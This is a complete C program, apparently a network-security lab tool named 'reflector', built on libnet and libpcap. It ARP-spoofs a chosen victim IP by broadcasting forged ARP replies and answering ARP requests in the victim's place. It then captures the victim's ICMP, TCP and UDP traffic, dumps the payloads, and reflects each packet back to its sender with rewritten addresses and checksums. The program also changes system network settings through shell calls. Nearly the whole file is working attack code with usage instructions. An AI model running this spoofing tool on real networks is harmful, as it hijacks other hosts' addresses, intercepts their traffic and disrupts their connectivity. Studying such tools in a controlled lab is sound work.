#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <libnet.h>
#include <pcap/pcap.h>

#define IP4_ADDR_LEN 4


/********************************************************************
 * Requirements:
 *     libnet: sudo apt install libnet1-dev
 * 	   libpcap: sudo apt install libpcap-dev
 *
 * Usage:
 * sudo ./reflector --interface <eth0> --victim-ip <1.1.1.1> 
 *                  --victim-ethernet <aa:aa:aa:aa:aa:aa>
 * 
 * Test:
 * SSH to victim IP from test machine which you have SSH access. You 
 * will SSH into test machine.
 *******************************************************************/

/* network interface */
static char * device;
/* machine targeted by attack */
static struct in_addr victim_ip;
static struct ether_addr victim_mac;
/* machine running reflector */
static struct in_addr host_ip;
static struct ether_addr host_mac;
/* broadcast address for ARP spoofing
 * IP: 0.0.0.0
 * MAC: ff:ff:ff:ff:ff:ff
 */
static struct in_addr broadcast_ip;
static struct ether_addr broadcast_mac;
/* libnet context */
static libnet_t * l;
/* libpcap packet capture handle */
static pcap_t * handle;
/* ptag reference numbers
 * reuse to avoid too many opened files
 */
libnet_ptag_t ptag_arp, ptag_ether;

/* show correct usage */
void print_usage(char *prog);
/* parse and validate command line arguments */
void parse_args(int argc, char *argv[]);
/* initiate */
void init_data(void);
/* send arp response telling spa is at sha */
void send_arp(
	struct ether_addr sha, struct in_addr spa, 
	struct ether_addr tha, struct in_addr tpa, 
	libnet_ptag_t *ptag_arp, libnet_ptag_t *ptag_ether
);
/* spoof host as victim */
void spoof(void);
/* process captured packet */
void process_packet(
	u_char *args, const struct pcap_pkthdr *header, const u_char *packet
);
/* decode Ethernet header */
void decode_ethernet_hdr(struct libnet_ethernet_hdr *ether);
/* decode ARP header */
void decode_arp_hdr(struct libnet_arp_hdr *arp);
/* decode ARP message */
void decode_arp_msg(uint8_t *arpmsg);
/* decode 20-byte IP header */
void decode_ipv4_hdr(struct libnet_ipv4_hdr *ip);
/* decode 8-byte ICMPV4 header */
void decode_icmpv4_hdr(struct libnet_icmpv4_hdr *icmpv4);
/* decode 20-byte TCP header */
void decode_tcp_hdr(struct libnet_tcp_hdr *tcp);
/* decode UDP header */
void decode_udp_hdr(struct libnet_udp_hdr *udp);
/* dumps raw data in hex byte and printable split format */
void dump_data(u_char *data, u_int length);
/* avoid waiting */
void wait_child(int signo);
/* process fatal error */
void process_error(char *failed, char *msg);
/* clean up at exit */
void cleanup(int sig);


int main(int argc, char *argv[]) {
	pid_t pid;
	
	if(argc != 7) {
		print_usage(argv[0]);
	}

	/* parse and validate command line arguments */
	parse_args(argc, argv);

	/* initiate */
	init_data();
	
	/* clean up at exit */
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
	signal(SIGHUP, cleanup);
	
	/* handle SIGCHLD signal */
	signal(SIGCHLD, wait_child);

	pid = fork();
	/* fork failed */
	if(pid == -1) {
		process_error("fork", strerror(errno));
	}
	/* child process */
    else if(pid == 0) {
		/* spoof host as victim */
		spoof();
	}
	/* parent process */
	else {
		/* process captured packet */
		pcap_loop(handle, -1, process_packet, NULL);
	}
	
    /* never reaches here */
    return EXIT_SUCCESS;
}

/* This function shows correct usage of program.
 */
void print_usage(char *prog) {
	printf("Usage: %s --interface <eth0> --victim-ip <1.1.1.1> "
	"--victim-ethernet <aa:aa:aa:aa:aa:aa>\n", prog);
	exit(EXIT_FAILURE);
}

/* This function parses and validates command line arguments.
 */
void parse_args(int argc, char *argv[]) {
	int i;
	
	for(i = 1; i < argc; i += 2) {
		if(strcmp(argv[i], "--interface") == 0) {
			device = argv[i+1];
			printf("Interface:\t\t%s\n", device);
		}
		else if(strcmp(argv[i], "--victim-ip") == 0) {
			/* invalid protocol address */
			if(inet_aton(argv[i+1], &victim_ip) == 0)
				print_usage(argv[0]);
			printf("Victim IP:\t\t%s\n", inet_ntoa(victim_ip));
		}
		else if(strcmp(argv[i], "--victim-ethernet") == 0) {
			/* invalid hardware address */
			if(!ether_aton_r(argv[i+1], &victim_mac))
				print_usage(argv[0]);
			printf("Victim Ethernet:\t%s\n", ether_ntoa(&victim_mac));
		}
		else {
			print_usage(argv[0]);
		}
	}
}

/* This function initiates program:
 * opens libnet context and libpcap packet capture handle
 */
void init_data(void) {
	char command[100];
	/* 256-byte error buffer */
	char errbuf[LIBNET_ERRBUF_SIZE];
	struct libnet_ether_addr * ptr_ha;
	/* IPv4 network number and mask associated with device */
	bpf_u_int32 net, mask;
	/* raw filter expression string */
	char filter_exp[128];
	/* compiled filter program */
	struct bpf_program filter;
	
	l = NULL;
	handle = NULL;
	ptag_arp = 0;
	ptag_ether = 0;
	
	/* make sure ip_forward is disabled */
	if(system("sysctl -w net.ipv4.ip_forward=0") == -1)
		process_error("system", "ip_forward");

	/* increase MTU for large packets*/
	command[99] = '\0';
	snprintf(command, 99, "sudo ifconfig %s mtu 2000", device);
	if(system(command) == -1)
		process_error("system", "increase MTU");
	
	/* open libnet context */
	l = libnet_init(LIBNET_LINK_ADV, device, errbuf);
	if(!l)
		process_error("libnet_init", errbuf);
	
	/* get host protocol address */
	host_ip.s_addr = libnet_get_ipaddr4(l);
	if(host_ip.s_addr == 0xFFFFFFFF)
		process_error("libnet_get_ipaddr4", libnet_geterror(l));
	printf("Host IP:\t\t%s\n", inet_ntoa(host_ip));
	
	/* get host hardware address */
	ptr_ha = libnet_get_hwaddr(l);
	if(!ptr_ha)
		process_error("libnet_get_hwaddr", libnet_geterror(l));
	memcpy(&host_mac, ptr_ha, ETHER_ADDR_LEN);
	printf("Host Ethernet:\t\t%s\n", ether_ntoa(&host_mac));
	
	/* set broadcast protocol address */
	memset(&broadcast_ip, 0x00, IP4_ADDR_LEN);
	printf("Broadcast IP:\t\t%s\n", inet_ntoa(broadcast_ip));

	/* set broadcast hardware address */
	memset(&broadcast_mac, 0xFF, ETHER_ADDR_LEN);
	printf("Broadcast Ethernet:\t%17s\n", ether_ntoa(&broadcast_mac));
	
	/* open libpcap packet capture handle */
	if(pcap_lookupnet(device, &net, &mask, errbuf) == PCAP_ERROR) {
		fprintf(stderr, "Error in pcap_lookupnet: %s\n", errbuf);
		net = 0;
		mask = 0;
	}
	handle = pcap_open_live(device, BUFSIZ, 0, 512, errbuf);
	if(!handle)
		process_error("pcap_open_live", errbuf);
	if(pcap_datalink(handle) != DLT_EN10MB)
		process_error("pcap_datalink", "Non-Ethernet");
	
	/* set up Berkeley Packet Filter
	 * allowing all ARP, and IPv4 ICMP, TCP and UDP targeting at victim
	 */
	strcpy(filter_exp, "arp or ((dst host ");
	strcat(filter_exp, inet_ntoa(victim_ip));
	strcat(filter_exp, ") and (ip proto \\icmp or \\tcp or \\udp))");
    
	if(pcap_compile(handle, &filter, filter_exp, 0, net) == PCAP_ERROR)
		process_error("pcap_compile", pcap_geterr(handle));
	if(pcap_setfilter(handle, &filter) == PCAP_ERROR)
		process_error("pcap_setfilter", pcap_geterr(handle));
	pcap_freecode(&filter);
}

/* This function sends ARP response telling spa is at sha.
 */
void send_arp(
	struct ether_addr sha, struct in_addr spa, struct ether_addr tha, 
	struct in_addr tpa, libnet_ptag_t *ptag_arp, libnet_ptag_t *ptag_ether
) {
	/* build arp */
	*ptag_arp = libnet_build_arp(
		ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, IP4_ADDR_LEN, 
		ARPOP_REPLY, (uint8_t *)&sha, (uint8_t *)&spa, (uint8_t *)&tha, 
		(uint8_t *)&tpa, NULL, 0, l, *ptag_arp
	);
	if(*ptag_arp == -1)
		process_error("libnet_build_arp", libnet_geterror(l));
	
	/* build ethernet */
	*ptag_ether = libnet_build_ethernet(
		(uint8_t *)&tha, (uint8_t *)&sha, ETHERTYPE_ARP, NULL, 
		0, l, *ptag_ether
	);
	if(*ptag_ether == -1)
		process_error("libnet_build_ethernet", libnet_geterror(l));
	
	/* send packet */
	if(libnet_write(l) == -1)
		process_error("libnet_write", libnet_geterror(l));
}

/* This function spoofs host as victim.
 */
void spoof(void) {
	printf(
		"************************************Spoof"
		"************************************\n"
	);
	printf("%-17s -> ", ether_ntoa(&host_mac));
	printf(
		"%17s : %-15s @ ", 
		ether_ntoa(&broadcast_mac), 
		inet_ntoa(victim_ip)
	);
	printf("%17s\n", ether_ntoa(&host_mac));
	
	while(1) {
		/* spoof host as victim */
		send_arp(
			host_mac, victim_ip, broadcast_mac, 
			broadcast_ip, &ptag_arp, &ptag_ether
		);
		sleep(10);
	}
}

/* This function processes captured packet:
 * responds to ARP request packet;
 * modifies IPv4 packet and reflects to attacker.
 */
void process_packet(
	u_char *args, const struct pcap_pkthdr *header, const u_char *packet
) {
	struct libnet_ethernet_hdr * ether;
	struct libnet_arp_hdr * arp;
	uint8_t * arpmsg;
	struct in_addr arp_tpa;
	struct libnet_ipv4_hdr * ip;
	struct libnet_icmpv4_hdr * icmpv4;
	struct libnet_tcp_hdr * tcp;
	struct libnet_udp_hdr * udp;
	uint8_t size_ip_hdr, size_tcp_hdr;
	uint16_t size_udp_hdr;
	uint8_t * payload;
	
	arp = NULL;
	ip = NULL;
	icmpv4 = NULL;
	tcp = NULL;
	udp = NULL;
	
	/* minimal packet size: 42
	 * ARP:    14 (LIBNET_ETH_H) + 8 (LIBNET_ARP_H) + 20 (payload)
	 * ICMPV4: 14 (LIBNET_ETH_H) + 20 (LIBNET_IPV4_H) + 
	 *         8 (LIBNET_ICMPV4_H) + x (payload)
	 * TCP:    14 (LIBNET_ETH_H) + 20 (LIBNET_IPV4_H) + 
	 *         14 (LIBNET_TCP_H) + x (payload)
	 * UDP:    14 (LIBNET_ETH_H) + 20 (LIBNET_IPV4_H) + 
	 *         8 (LIBNET_UDP_H) + x (payload)
	 */
	if(header->len < 42)
		return;
	
	ether = (struct libnet_ethernet_hdr *)packet;

	/* ARP packet */
	if(ntohs(ether->ether_type) == ETHERTYPE_ARP) {
		arp = (struct libnet_arp_hdr *)(packet + LIBNET_ETH_H);
		arpmsg = (uint8_t *)(packet + LIBNET_ETH_H + LIBNET_ARP_H);
		memcpy(&arp_tpa, arpmsg + 16, 4);
		if(
			ntohs(arp->ar_op) == ARPOP_REQUEST && 
			arp_tpa.s_addr == victim_ip.s_addr
		) {
			printf(
				"-----------------------Received ARP Packet: "
				"%4d bytes-----------------------\n", header->len
			);
			/* decode original packet */
			decode_ethernet_hdr(ether);
			decode_arp_hdr(arp);
			decode_arp_msg(arpmsg);

			arp->ar_op = 0x0200;                      // big-endian
			/* send to original sender */
			memcpy(arpmsg + 10, arpmsg, 6);
			memcpy(arpmsg + 16, arpmsg + 6, 4);
			/* send from host as if from victim */
			memcpy(arpmsg, &host_mac, 6);
			/* victim_ip */
			memcpy(arpmsg + 6, &arp_tpa, 4);
		}
		else
			return;
	}
	/* IPv4 packet */
	else if(ntohs(ether->ether_type) == ETHERTYPE_IP) {		
		ip = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
		/* (ip->ip_hl & 0x0F) * 4, ip->ip_hl << 2 also works */
		size_ip_hdr = (uint8_t)ip->ip_hl * 4;              // 
		if(
			size_ip_hdr < 20 || 
			header->len - LIBNET_ETH_H - size_ip_hdr < 8
		)
			return;
		if(ip->ip_dst.s_addr != victim_ip.s_addr)
			return;
		printf(
			"-----------------------Received IP4 Packet: "
			"%4d bytes-----------------------\n", header->len
		);
		/* decode original packet */
		decode_ethernet_hdr(ether);
		decode_ipv4_hdr(ip);

		/* send to original sender IP from victim IP */
		ip->ip_dst.s_addr = ip->ip_src.s_addr;
		ip->ip_src.s_addr = victim_ip.s_addr;
		/* default 64 for linux */
		ip->ip_ttl = 64;
		
		/* ICMPv4 packet */
		if(ip->ip_p == 0x01) {
			icmpv4 = (struct libnet_icmpv4_hdr *)(
				packet + LIBNET_ETH_H + size_ip_hdr
			);
			decode_icmpv4_hdr(icmpv4);

			/* recalculate ICMPv4 header checksum: no need */
		}
		/* TCP packet */
		else if(ip->ip_p == 0x06) {
			tcp = (struct libnet_tcp_hdr *)(
				packet + LIBNET_ETH_H + size_ip_hdr
			);
			size_tcp_hdr = (uint8_t)tcp->th_off * 4;
			if(size_tcp_hdr < 20)
				return;
			decode_tcp_hdr(tcp);
			if(header->len > LIBNET_ETH_H + size_ip_hdr + size_tcp_hdr) {
				payload = (uint8_t *)(
					packet + LIBNET_ETH_H + size_ip_hdr + size_tcp_hdr
				);
				printf("Payload\n");
				dump_data(
					payload, 
					header->len - LIBNET_ETH_H - size_ip_hdr - size_tcp_hdr
				);
			}

			/* recalculate TCP header checksum */
			if(libnet_inet_checksum(
				l, (uint8_t *)ip, IPPROTO_TCP, header->len - LIBNET_ETH_H, 
				packet, packet + header->len
			) == -1)
				process_error("libnet_inet_checksum", libnet_geterror(l));
		}
		/* UDP packet */
		else if(ip->ip_p == 0x11) {
			udp = (struct libnet_udp_hdr *)(
				packet + LIBNET_ETH_H + size_ip_hdr
			);
			size_udp_hdr = ntohs(udp->uh_ulen);
			if(size_udp_hdr < 8)
				return;
			decode_udp_hdr(udp);
			if(header->len > LIBNET_ETH_H + size_ip_hdr + size_udp_hdr) {
				payload = (uint8_t *)(
					packet + LIBNET_ETH_H + size_ip_hdr + size_udp_hdr
				);
				printf("Payload\n");
				dump_data(
					payload, 
					header->len - LIBNET_ETH_H - size_ip_hdr - size_udp_hdr
				);
			}

			/* recalculate UDP header checksum */
			if(libnet_inet_checksum(
				l, (uint8_t *)ip, IPPROTO_UDP, header->len - LIBNET_ETH_H, 
				packet, packet + header->len
			) == -1)
				process_error("libnet_inet_checksum", libnet_geterror(l));
		}
		else
			return;
		
		/* recalculate IPv4 header checksum */
		if(libnet_inet_checksum(
			l, (uint8_t *)ip, IPPROTO_IP, header->len - LIBNET_ETH_H, 
			packet, packet + header->len
		) == -1)
			process_error("libnet_inet_checksum", libnet_geterror(l));
	}
	else
		return;
	
	/* send to original sender MAC from host MAC */
	memcpy(&ether->ether_dhost, &ether->ether_shost, ETHER_ADDR_LEN);
	memcpy(&ether->ether_shost, &host_mac, ETHER_ADDR_LEN);
	/* decode modified packet */
	if(arp) {
		printf(
			"************************************Spoof"
			"************************************\n"
		);
		printf("%-17s -> ", ether_ntoa((struct ether_addr *)arpmsg));
		printf(
			"%17s : %-15s @ ", 
			ether_ntoa((struct ether_addr *)(arpmsg + 10)), 
			inet_ntoa(*((struct in_addr *)(arpmsg + 6)))
		);
		printf("%17s\n", ether_ntoa((struct ether_addr *)arpmsg));
		decode_ethernet_hdr(ether);
		decode_arp_hdr(arp);
		decode_arp_msg(arpmsg);
	}
	else {
		printf(
			"------------------------------Reflecting"
			" Packet------------------------------\n"
		);
		decode_ethernet_hdr(ether);
		decode_ipv4_hdr(ip);
		if(icmpv4)
			decode_icmpv4_hdr(icmpv4);
		else if(tcp)
			decode_tcp_hdr(tcp);
		else
			decode_udp_hdr(udp);
	}
	/* inject modified packet
	 * potential error - send: Message too long
	 * possible solution - increase MTU temporarily
	 */
	if(libnet_adv_write_link(l, packet, header->len) == -1)
		process_error("libnet_adv_write_link", libnet_geterror(l));
}

/* This function decodes Ethernet header */
void decode_ethernet_hdr(struct libnet_ethernet_hdr *ether) {
	printf("Ethernet Header\n");
	printf(
		"  | %-17s: %s\n", "Destination MAC", 
		ether_ntoa((struct ether_addr *)&ether->ether_dhost)
	);
	printf(
		"  | %-17s: %s\n", "Source MAC", 
		ether_ntoa((struct ether_addr *)&ether->ether_shost)
	);
	printf(
		"  | %-17s: 0x%04x\n", "Protocol Type", 
		ntohs(ether->ether_type)
	);
}

/* This function decodes ARP header */
void decode_arp_hdr(struct libnet_arp_hdr *arp) {
	printf("ARP Header\n");
	printf("  | %-17s: 0x%04x\n", "Format of HA", ntohs(arp->ar_hrd));
	printf("  | %-17s: 0x%04x\n", "Format of PA", ntohs(arp->ar_pro));
	printf("  | %-17s: 0x%02x\n", "Length of HA", arp->ar_hln);
	printf("  | %-17s: 0x%02x\n", "Length of PA", arp->ar_pln);
	printf("  | %-17s: 0x%04x\n", "Operation Type", ntohs(arp->ar_op));
}

/* This function decodes ARP message */
void decode_arp_msg(uint8_t *arpmsg) {
	printf("ARP Message\n");
	printf(
		"  | %-17s: %s\n", "Sender MAC", 
		ether_ntoa((struct ether_addr *)arpmsg)
	);
	printf(
		"  | %-17s: %s\n", "Sender IP", 
		inet_ntoa(*((struct in_addr *)(arpmsg + 6)))
	);
	printf(
		"  | %-17s: %s\n", "Target MAC", 
		ether_ntoa((struct ether_addr *)(arpmsg + 10))
	);
	printf(
		"  | %-17s: %s\n", "Target IP", 
		inet_ntoa(*((struct in_addr *)(arpmsg + 16)))
	);
}

/* This function decodes 20-byte IP header */
void decode_ipv4_hdr(struct libnet_ipv4_hdr *ip) {
	uint8_t length;
	
	length = (uint8_t)ip->ip_hl * 4;
	printf("IPv4 Header\n");
	printf("  | %-17s: %hhu\n", "Version", (uint8_t)ip->ip_v);
	printf("  | %-17s: %hhu\n", "Header Length", length);
	printf("  | %-17s: %hhu\n", "Type of Service", ip->ip_tos);
	printf("  | %-17s: %hu\n", "Total Length", ntohs(ip->ip_len));
	printf("  | %-17s: %hu\n", "Identification", ntohs(ip->ip_id));
	/* ignore ip->ip_off */
	printf("  | %-17s: %hhu\n", "Time to Live", ip->ip_ttl);
	printf("  | %-17s: 0x%02x\n", "Protocol", ip->ip_p);
	printf("  | %-17s: %hu\n", "Checksum", ntohs(ip->ip_sum));
	printf("  | %-17s: %s\n", "Source IP", inet_ntoa(ip->ip_src));
	printf("  | %-17s: %s\n", "Destination IP", inet_ntoa(ip->ip_dst));
	if(length > LIBNET_IPV4_H) {
		printf("IPv4 Header Options\n");
		dump_data((u_char *)(ip+LIBNET_IPV4_H), length-LIBNET_IPV4_H);
	}
}

/* This function decodes 8-byte ICMPV4 header */
void decode_icmpv4_hdr(struct libnet_icmpv4_hdr *icmpv4) {
	printf("ICMPV4 Header\n");
	printf("  | %-17s: 0x%02x\n", "ICMP Type", icmpv4->icmp_type);
	printf("  | %-17s: 0x%02x\n", "ICMP Code", icmpv4->icmp_code);
	printf("  | %-17s: %hu\n", "ICMP Checksum", ntohs(icmpv4->icmp_sum));
	printf("  | %-17s: %hu\n", "ICMP ID", ntohs(icmpv4->icmp_id));
	printf("  | %-17s: %hu\n", "ICMP Sequence", ntohs(icmpv4->icmp_seq));
}

/* This function decodes 20-byte TCP header */
void decode_tcp_hdr(struct libnet_tcp_hdr *tcp) {
	uint8_t length;
	
	length = (uint8_t)tcp->th_off * 4;
	printf("TCP Header\n");
	printf("  | %-17s: %hu\n", "Source Port", ntohs(tcp->th_sport));
	printf("  | %-17s: %hu\n", "Destination Port", ntohs(tcp->th_dport));
	printf("  | %-17s: %u\n", "Sequence Number", ntohl(tcp->th_seq));
	printf("  | %-17s: %u\n", "ACK Number", ntohl(tcp->th_ack));
	printf("  | %-17s: %hhu\n", "Header Length", length);
	printf("  | %-17s:", "Flags");
	if(tcp->th_flags & TH_FIN)
		printf(" FIN");
	if(tcp->th_flags & TH_SYN)
		printf(" SYN");
	if(tcp->th_flags & TH_RST)
		printf(" RST");
	if(tcp->th_flags & TH_PUSH)
		printf(" PSH");
	if(tcp->th_flags & TH_ACK)
		printf(" ACK");
	if(tcp->th_flags & TH_URG)
		printf(" URG");
	if(tcp->th_flags & TH_ECE)
		printf(" ECE");
	if(tcp->th_flags & TH_CWR)
		printf(" CWR");
	printf("\n");
	printf("  | %-17s: %hu\n", "Window", ntohs(tcp->th_win));
	printf("  | %-17s: %hu\n", "Checksum", ntohs(tcp->th_sum));
	printf("  | %-17s: %hu\n", "Urgent Pointer", ntohs(tcp->th_urp));
	if(length > LIBNET_TCP_H) {
		printf("TCP Header Options\n");
		dump_data((u_char *)(tcp+LIBNET_TCP_H), length-LIBNET_TCP_H);
	}
}

/* This function decodes UDP header */
void decode_udp_hdr(struct libnet_udp_hdr *udp) {
	printf("UDP Header\n");
	printf("  | %-17s: %hu\n", "Source Port", ntohs(udp->uh_sport));
	printf("  | %-17s: %hu\n", "Destination Port", ntohs(udp->uh_dport));
	printf("  | %-17s: %hu\n", "Header Length", ntohs(udp->uh_ulen));
	printf("  | %-17s: %hu\n", "Checksum", ntohs(udp->uh_sum));
}

/* This function dumps raw data in hex bytes and printable split 
 * format.
 */
void dump_data(u_char *data, u_int length) {
	u_char byte;
	u_int i, j;
	
	for(i=0; i < length; i++) {
		printf("%02x ", data[i]);
		if(i%16 == 15 || i == length-1) {
			for(j=0; j < 15-i%16; j++)
				printf("   ");
			printf("| ");
			for(j=i-i%16; j <= i; j++) {
				byte = data[j];
				if(byte > 31 && byte < 127)
					printf("%c", byte);
				/* outside printable char range */
				else
					printf(".");
			}
			/* end of dump line: 16 bytes each line */
			printf("\n");
		}
	}
}

/* This function handles SIGCHLD signal.
 * https://www.cnblogs.com/wuchanming/p/4020463.html
 */
void wait_child(int signo) {  
    int status;
    while (waitpid(-1, &status, WNOHANG) > 0) {
		continue;
    }		
}

/* This function processes fatal error and closes devices.
 */
void process_error(char *failed, char *msg) {
	fprintf(stderr, "Falta Error in %s: %s\n", failed, msg);
	/* close libnet context */
	if(l)
		libnet_destroy(l);
	/* close libpcap packet capture handle */
	if(handle)
		pcap_close(handle);
	exit(EXIT_FAILURE);
}

/* This function resets spoofing and system settings, and closes 
 * devices at exit.
 */
void cleanup(int sig) {
	char command[100];
	
	printf(
		"\n*********************************Cleaning"
		"************************************\n"
	);
	printf("%-17s -> ", ether_ntoa(&host_mac));
	printf(
		"%17s : %-15s @ ", 
		ether_ntoa(&broadcast_mac), 
		inet_ntoa(victim_ip)
	);
	printf("%17s\n", ether_ntoa(&victim_mac));
	
	/* stop spoofing host as victim */
	send_arp(
		victim_mac, victim_ip, broadcast_mac, 
		broadcast_ip, &ptag_arp, &ptag_ether
	);
	
	/* reset MTU */
	command[99] = '\0';
	snprintf(command, 99, "sudo ifconfig %s mtu 1500", device);
	system(command);
	
	/* close libnet context */
	libnet_destroy(l);
	/* close libpcap packet capture handle */
	pcap_close(handle);

	exit(EXIT_SUCCESS);
}
